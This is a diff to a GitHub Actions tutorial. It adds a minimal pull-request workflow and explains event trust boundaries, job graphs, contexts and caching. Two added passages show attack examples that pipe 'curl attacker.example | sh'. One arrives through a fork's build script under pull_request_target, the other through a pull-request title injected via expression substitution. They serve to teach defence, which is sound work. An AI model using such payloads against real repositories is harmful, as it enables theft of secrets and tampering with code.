@@ -4,7 +4,61 @@
 
 ---
 
-## 1. A Complete Minimal Workflow
+## The short version
+
+You need GitHub to run a command when something happens to your repository, and proof that it ran. A workflow answers that with three nested pieces: an **event** (what happened), a **job** (the compute that runs steps), and a **step** (one command inside that job). Those three are sufficient by themselves — permissions, concurrency, matrices, and caching only change how safely or efficiently the run happens, not whether it produces a result. GitHub reports every job as a **check**, a pass/fail marker attached to the commit or pull request, which is the thing you'll watch turn green below.
+
+**What you need (3 things):**
+
+1. An event that creates a run — here, `pull_request`.
+2. A job — steps that share one runner.
+3. A step — one command.
+
+**The code:**
+
+```yaml
+name: Hello Check
+
+on:
+  pull_request:
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print a greeting
+        run: echo "Hello from Actions"
+```
+
+**Success signal:** Opening a pull request shows a "Hello Check / greet" check that turns green within a few seconds; its step log contains `Hello from Actions`.
+
+**Not handled yet:** [running matrix variations in one job](#1-a-workflow-needs-only-one-event-one-job-one-step), [validating merge-queue candidates](#2-the-event-you-choose-sets-the-runs-trust-boundary), [narrowing what the run's token can do](#6-each-context-has-one-safe-use-and-one-trap), [limiting overlapping runs](#8-environments-and-concurrency-are-independent), and [caching dependencies](#7-artifacts-caches-and-registries-are-not-interchangeable).
+
+---
+
+## 1. A Workflow Needs Only One Event, One Job, One Step
+
+Before you reach for permissions, concurrency, or a matrix, the workflow above is already complete: `on` names the event, `jobs` declares one job with a compute boundary (`runs-on`), and `steps` lists the commands that run on it. Every keyword introduced later in this note narrows or hardens one of those three ideas — none of them adds a fourth.
+
+> **Core:** an event, a job, and a step are the whole mechanism. Everything below this line is optional until you have a reason to need it.
+
+```yaml
+name: Hello Check
+
+on:
+  pull_request:
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print a greeting
+        run: echo "Hello from Actions"
+```
+
+That workflow has no `permissions:` block, no `concurrency:` group, and one job with one step — and it still produces a real, observable check. Nothing about correctness depends on the parts you haven't added yet.
+
+> **Production:** a single untested Python version, an unbounded `GITHUB_TOKEN`, and no protection against two pushes racing each other are all fine while you're learning the shape, and all wrong once real contributors depend on the result. The workflow below adds exactly those three things — a version matrix, a read-only token, and a concurrency group — and nothing else.
 
 ```yaml
 name: Pull Request CI
@@ -66,9 +120,11 @@ The workflow declares six different concerns:
 | `runs-on` | The runner trust and compute boundary |
 | `steps` | Ordered commands or actions within one job |
 
+> **Edge case:** `merge_group` only needs to be in `on` when a repository ruleset requires this workflow's check inside GitHub's merge queue (see [the next section](#2-the-event-you-choose-sets-the-runs-trust-boundary)). A repository without that ruleset never dispatches the event, so the job is simply never created for it.
+
 ---
 
-## 2. Events Define the Security Context
+## 2. The Event You Choose Sets the Run's Trust Boundary
 
 The event determines more than timing. It determines the ref, payload, token behavior, and availability of secrets.
 
@@ -82,6 +138,8 @@ The event determines more than timing. It determines the ref, payload, token beh
 | `repository_dispatch` | Custom or cross-repository event | Treat `client_payload` as untrusted input |
 | `schedule` | Maintenance and full regression | Runs the default branch; schedules can be delayed under load |
 | `pull_request_target` | Privileged PR metadata automation | Runs base-branch workflow with target-repository privileges |
+
+Here is why the last row matters. A contributor opens a pull request and edits `ci/build.sh` on their fork to add `curl attacker.example | sh`. If the target repository's workflow listens for `pull_request_target` and then checks out `github.event.pull_request.head.sha` — the contributor's own commit — before running that script, the job executes the attacker's code. It does so with the base repository's `GITHUB_TOKEN`, secrets, and write access, because `pull_request_target` always runs the workflow *file* from the base branch, but with target-repository authority, regardless of whose commit gets checked out. The attacker's shell command now runs with that authority: it can exfiltrate repository secrets or push a commit as the workflow's token. Nothing about the YAML looks wrong on its own — the attack lives entirely in *which ref gets checked out and executed*, not in a visibly malicious line of workflow code.
 
 ⚠️ Do not check out and execute untrusted pull-request code in a privileged `pull_request_target` job. Use it only for carefully reviewed metadata operations, or split the work into an unprivileged producer and privileged consumer with a narrow artifact contract.
 
@@ -101,7 +159,7 @@ Both the branch and path conditions must match. A filtered workflow may never cr
 
 ---
 
-## 3. Jobs Form a Directed Acyclic Graph
+## 3. Jobs Run in Parallel Unless `needs` Forces an Order
 
 Jobs run in parallel unless `needs` creates an edge:
 
@@ -137,6 +195,8 @@ Data does not automatically move with the graph:
 - use workflow **artifacts** for files and reports;
 - publish release artifacts to a durable package or container registry;
 - never use a cache as an artifact-transfer mechanism.
+
+> **Key insight**: events choose the trust context a run executes under; the job graph only chooses execution order. Data never crosses that graph implicitly — it moves solely through explicit outputs or artifacts — which is why the boundary an event sets stays intact no matter how the DAG is shaped.
 
 By default, a job whose dependency fails or is skipped is also skipped. Use `if: always()` only where the job explicitly interprets upstream results or performs cleanup.
 
@@ -186,6 +246,8 @@ Keep outputs non-sensitive. GitHub may redact values that look secret, and job o
 
 `${{ ... }}` is GitHub's expression language, not shell syntax.
 
+A contributor titles their pull request `fix bug"; curl attacker.example | sh #`. If a step runs `echo "${{ github.event.pull_request.title }}"`, GitHub substitutes the expression *before* the shell ever starts, so the generated script text becomes `echo "fix bug"; curl attacker.example | sh #"` — a second, attacker-chosen command that the shell then executes with the job's own token and permissions. The bug isn't the `echo`; it's that GitHub let a string chosen entirely by the pull-request author become part of the script's source text instead of one of its values.
+
 ```yaml
 # ❌ The PR title is inserted into a generated shell script.
 - run: echo "${{ github.event.pull_request.title }}"
@@ -210,7 +272,7 @@ Prefer a real script in the repository when logic grows beyond a few lines. It i
 
 ---
 
-## 6. Contexts and Configuration Boundaries
+## 6. Each Context Has One Safe Use and One Trap
 
 | Value | Use for | Avoid |
 |-------|---------|-------|
@@ -226,7 +288,7 @@ Set static configuration at the narrowest useful scope. Set permissions and sens
 
 ---
 
-## 7. Artifacts, Caches, and Registries
+## 7. Artifacts, Caches, and Registries Are Not Interchangeable
 
 ```text
 dependency cache
@@ -277,7 +339,7 @@ Configure both when the target cannot tolerate overlapping state changes. See [E
 
 ---
 
-## 9. Failure Semantics
+## 9. Timeout, Continue-on-Error, and Fail-Fast Are Not Interchangeable
 
 Use these controls deliberately:
 
